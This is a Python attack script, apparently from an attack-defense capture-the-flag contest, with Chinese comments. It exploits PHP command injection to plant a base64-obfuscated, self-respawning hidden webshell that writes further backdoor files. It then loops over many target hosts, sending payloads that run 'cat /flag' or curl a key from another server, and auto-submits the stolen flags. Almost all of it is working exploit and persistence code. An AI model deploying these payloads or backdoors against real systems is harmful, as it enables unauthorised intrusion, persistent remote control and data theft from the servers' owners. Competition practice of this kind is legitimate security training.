#!/usr/bin/env python
# -*- coding: utf-8 -*-
# @Time    : 2021/10/29 16:50
# @Author  : upload
# @File    : 1111111111.py
# @Software: PyCharm
# !/usr/bin/env python
# -*- coding: utf-8 -*-
# @Time    : 2021/10/29 9:33
# @Author  : upload
# @File    : get_flag.py
# @Software: PyCharm
import requests
import time
import re

proxy = '127.0.0.1:8080'
proxies = {
    'http': 'http://' + proxy,
    'https': 'https://' + proxy,
}

burp0_url = "http://4.4.27.100:80/doaction.php"
burp0_cookies = {"PHPSESSID": "ouk5p6il9d6n0bifskavlrh1u4"}
burp0_headers = {"Cache-Control": "max-age=0", "Upgrade-Insecure-Requests": "1",
                 "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36",
                 "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9",
                 "Accept-Encoding": "gzip, deflate", "Accept-Language": "zh-CN,zh;q=0.9", "Connection": "close"}


# 写不死马
def wirte_bsm():
    url = "http://192.168.57.134/doAction.php"
    data = {
        "ip": "file_put_contents('/var/www/html/images/.1ndex.php',base64_decode('PD9waHANCnNldF90aW1lX2xpbWl0KDApOw0KaWdub3JlX3VzZXJfYWJvcnQoMSk7DQpjaG1vZCgkX1NFUlZFUlsnU0NSSVBUX0ZJTEVOQU1FJ10sIDA3NzcpOw0KdW5saW5rKF9fRklMRV9fKTsNCndoaWxlKDEpeyAgIA0KICAgIHVzbGVlcCg1MDAwKTsNCiAgICBpZihmaWxlX2V4aXN0cygnLmRyMHAzLnBocCcpKXsNCiAgICB9ZWxzZXsNCiAgZmlsZV9wdXRfY29udGVudHMoJy5kcjBwMy5waHAnLGJhc2U2NF9kZWNvZGUoJ1BEOXdhSEFnWTJ4aGMzTWdTMVZaUlh0d2RXSnNhV01rUkVGWVZ6MXVkV3hzTzNCMVlteHBZeVJNVWxoV1BXNTFiR3c3Wm5WdVkzUnBiMjRnWDE5amIyNXpkSEoxWTNRb0tYc2tkR2hwY3kwK1JFRllWejBuYlhZeloyTXpZbWxsY25CMllYUXlkR3R5Ym5oMWVteHpialZ2YzNOdmVTYzdKSFJvYVhNdFBrUkJXRmN5UFNkdGRqTm5Zek5pYVdWeVpHRmtZV1J6YjI5dGMyVnNjMlZoY1hoNGMza25PeVIwYUdsekxUNU1VbGhXTWoxQVUxbFlTaWdrZEdocGN5MCtSRUZZVnpJcE95UjBhR2x6TFQ1TVVsaFdQVUJUV1ZoS0tDUjBhR2x6TFQ1RVFWaFhLVHRwWmlodFpEVW9KRjlRVDFOVVd5SndZWE56SWwwcFBUMGlaVEV3WVdSak16azBPV0poTlRsaFltSmxOVFpsTURVM1pqSXdaamc0TTJVaUtYdEFaWFpoYkNnaUx5cEhibE53WlQxMUtpOGlMaVIwYUdsekxUNU1VbGhXTWk0aUx5cEhibE53WlQxMUtpOGlLVHQ5YVdZb2JXUTFLQ1JmVUU5VFZGc2lkWE5sY201aGJXVWlYU2s5UFNJM1l6SmtNMlV3WWpFeFlXRXlOVEUzTTJFeU1EQTRNalkwTkRGbE5ETTRNU0lwZTBCbGRtRnNLQ0l2S2tkdVUzQmxQWFVxTHlJdUpIUm9hWE10UGt4U1dGWXVJaThxUjI1VGNHVTlkU292SWlrN2ZYMTlibVYzSUV0VldVVW9LVHRtZFc1amRHbHZiaUJOVGxkTEtDUlJVMFpZS1hza1FrRlRSVE15WDBGTVVFaEJRa1ZVUFNkaFltTmtaV1puYUdscWEyeHRibTl3Y1hKemRIVjJkM2g1ZWpJek5EVTJOeWM3SkU1TVNFSTlKeWM3SkhZOU1Ec2tkbUpwZEhNOU1EdG1iM0lvSkdrOU1Dd2thajF6ZEhKc1pXNG9KRkZUUmxncE95UnBQQ1JxT3lScEt5c3BleVIyUER3OU9Ec2tkaXM5YjNKa0tDUlJVMFpZV3lScFhTazdKSFppYVhSekt6MDRPM2RvYVd4bEtDUjJZbWwwY3o0OU5TbDdKSFppYVhSekxUMDFPeVJPVEVoQ0xqMGtRa0ZUUlRNeVgwRk1VRWhCUWtWVVd5UjJQajRrZG1KcGRITmRPeVIySmowb0tERThQQ1IyWW1sMGN5a3RNU2s3ZlgxcFppZ2tkbUpwZEhNK01DbDdKSFk4UEQwb05TMGtkbUpwZEhNcE95Uk9URWhDTGowa1FrRlRSVE15WDBGTVVFaEJRa1ZVV3lSMlhUdDljbVYwZFhKdUpFNU1TRUk3ZldaMWJtTjBhVzl1SUZOWldFb29KRkZUUmxncGV5Uk9URWhDUFNjbk95UjJQVEE3SkhaaWFYUnpQVEE3Wm05eUtDUnBQVEFzSkdvOWMzUnliR1Z1S0NSUlUwWllLVHNrYVR3a2Fqc2thU3NyS1hza2RqdzhQVFU3YVdZb0pGRlRSbGhiSkdsZFBqMG5ZU2NtSmlSUlUwWllXeVJwWFR3OUozb25LWHNrZGlzOUtHOXlaQ2drVVZOR1dGc2thVjBwTFRrM0tUdDlaV3h6WldsbUtDUlJVMFpZV3lScFhUNDlKekluSmlZa1VWTkdXRnNrYVYwOFBTYzNKeWw3SkhZclBTZ3lOQ3NrVVZOR1dGc2thVjBwTzMxbGJITmxlMlY0YVhRb01TazdmU1IyWW1sMGN5czlOVHQzYUdsc1pTZ2tkbUpwZEhNK1BUZ3BleVIyWW1sMGN5MDlPRHNrVGt4SVFpNDlZMmh5S0NSMlBqNGtkbUpwZEhNcE95UjJKajBvS0RFOFBDUjJZbWwwY3lrdE1TazdmWDF5WlhSMWNtNGtUa3hJUWp0OScpKTsNCiAgICB9DQogICAgaWYoZmlsZV9leGlzdHMoJy5jb25mMWcucGhwJykpew0KICAgIH1lbHNlew0KICBmaWxlX3B1dF9jb250ZW50cygnLmNvbmYxZy5waHAnLGJhc2U2NF9kZWNvZGUoJ1BEOXdhSEFnYVdZb2MzVmljM1J5S0cxa05TaEFKRjlTUlZGVlJWTlVXeUpySWwwcExESTFLVDA5SWpReFpUUXpPREVpS1h0QVpYWmhiQ2drWDFCUFUxUmJZVjBwTzMwZycpKTsNCiAgICB9DQp9DQo/Pg=='));"}
    try:
        r = requests.post(url, headers=burp0_headers, data=data, cookies=burp0_cookies, timeout=1)
        if r.status_code == 200:
            # 注入不死马
            ip = "http://192.168.57.134" + "/images/.1ndex.php"
            print("不死马写入成功：", ip)
            r2 = requests.get(ip, timeout=1)
            time.sleep(0.5)
    except:
        print('异常')
    print('退出')

# 不死马拿shell
def get_flag_bsm():
    for i in range(1, 48):
        ip = "http://4.4.{}".format(i) + ".100:80"
        url1 = ip + "/images/.conf1g.php"
        url2 = ip + "/images/.dr0p3.php"
        url2 = "http://192.168.57.134" + "/images/.dr0p3.php"
        get_flag = 'system("cat /flag");'
        data1 = {"k": "Dropsec_upload", "a": get_flag}
        data2 = {"username": "Dropsec_upload", "zero": get_flag}
        try:
            # 用url2 不死马
            r = requests.post(url2, headers=burp0_headers, data=data2, cookies=burp0_cookies, timeout=1,
                              proxies=proxies)
            if r.status_code == 200:
                print("得到flag：", url2)
                print(r.text)
                # ss = re.findall('.*(key\{.*\}).*', r.text)
                with open("flag.txt", 'a+') as f:
                    f.write(r.text)
            # 用url1 不死马
            # r = requests.post(url1, headers=burp0_headers, data=data1, cookies=burp0_cookies, timeout=1)
            # if r.status_code == 200:
            #     print("得到flag：",url1)
            #     # ss = re.findall('.*(key\{.*\}).*', r.text)
            #     with open("flag.txt", 'a') as f:
            #         pass
        except:
            print('异常2222 ，没拿到flag')
            continue


def tijiao_flag():
    for flag in open('flag.txt'):
        flag = flag.replace('\n', '')
        burp0_url = "http://192.168.100.20:80/Title/TitleView/savecomprecord"
        burp0_cookies = {"PHPSESSID": "kd53i9kn5otp0li3bhip58p4n1"}
        burp0_headers = {"Accept": "*/*", "X-Requested-With": "XMLHttpRequest",
                         "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36",
                         "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8",
                         "Origin": "http://192.168.100.20", "Referer": "http://192.168.100.20/",
                         "Accept-Encoding": "gzip, deflate", "Accept-Language": "zh-CN,zh;q=0.9", "Connection": "close"}
        burp0_data = {"answer": flag}
        r = requests.post(burp0_url, headers=burp0_headers, cookies=burp0_cookies, data=burp0_data)
        print(r.text)
        time.sleep(2)


def exp2():
    for i in range(1, 48):
        ip = "http://4.4.{}".format(i) + ".100:80/" + "doaction.php"
        data = {"id": "system('curl http://192.168.100.20/Getkey')"}
        try:
            r = requests.get(ip, headers=burp0_headers, data=data, cookies=burp0_cookies, timeout=1)

            print(ip)
            if r.status_code == 200:
                with open("flag.txt", 'a') as f:
                    f.write(r)
        except:
            continue


def exp3():
    for i in range(1, 48):
        ip = "http://4.4.{}".format(i) + ".100:80/" + "images/2372d6d25faac832ce2383cf14031a1b.phtml"
        # ip = "http://4.4.37.100:80/images/2372d6d25faac832ce2383cf14031a1b.phtml"
        data = {"c": "system('curl http://192.168.100.20/Getkey');"}
        try:
            r = requests.post(ip, data=data, timeout=1)
            print(ip)
            if r.status_code == 200:
                ss = re.findall('.*(key\{.*\}).*', r.text)
                with open("flag.txt", 'a') as f:
                    f.write(ss[0] + "\n")
        except:
            continue


def exp4():
    for i in range(1, 48):
        ip = "http://4.4.{}".format(i) + ".100:80/" + "images/93277ac25e12820af94c499ba23e769f.phtml"
        # ip = "http://4.4.37.100:80/images/2372d6d25faac832ce2383cf14031a1b.phtml"
        data = {"c": "system('curl http://192.168.100.20/Getkey');"}
        try:
            r = requests.post(ip, data=data, timeout=1)
            print(ip)
            if r.status_code == 200:
                ss = re.findall('.*(key\{.*\}).*', r.text)
                with open("flag.txt", 'a') as f:
                    f.write(ss[0] + "\n")
        except:
            continue


def jiao_shi():
    for i in range(1, 48):
        ip = "http://4.4.{}".format(i) + ".100:80/" + "images/93277ac25e12820af94c499ba23e769f.phtml"
        # ip = "http://4.4.37.100:80/images/2372d6d25faac832ce2383cf14031a1b.phtml"
        data = {"hack": "system('curl http://192.168.100.20/Getkey');"}
        try:
            r = requests.post(ip, data=data, timeout=1)
        except:
            continue


# 不死马
def exp5():
    for i in range(1, 48):
        ip = "http://4.4.{}".format(i) + ".100:80/" + "images/.a72625814391c5694c6de06f42b5c14c.php"
        # ip = "http://4.4.37.100:80/images/2372d6d25faac832ce2383cf14031a1b.phtml"
        data = {"pass": "164408830a5e3b401797f6650275cd48", "cmd": "system('curl http://192.168.100.20/Getkey');"}
        try:
            r = requests.post(ip, data=data, timeout=1)
            print(ip)
            if r.status_code == 200:
                ss = re.findall('.*(key\{.*\}).*', r.text)
                with open("flag.txt", 'a') as f:
                    f.write(ss[0] + "\n")
        except:
            continue


if __name__ == '__main__':
    # exp1()
    # exp2()
    # exp3()
    # exp4()
    # exp5()
    # tijiao_flag()
    # jiao_shi()
    wirte_bsm()
    get_flag_bsm()
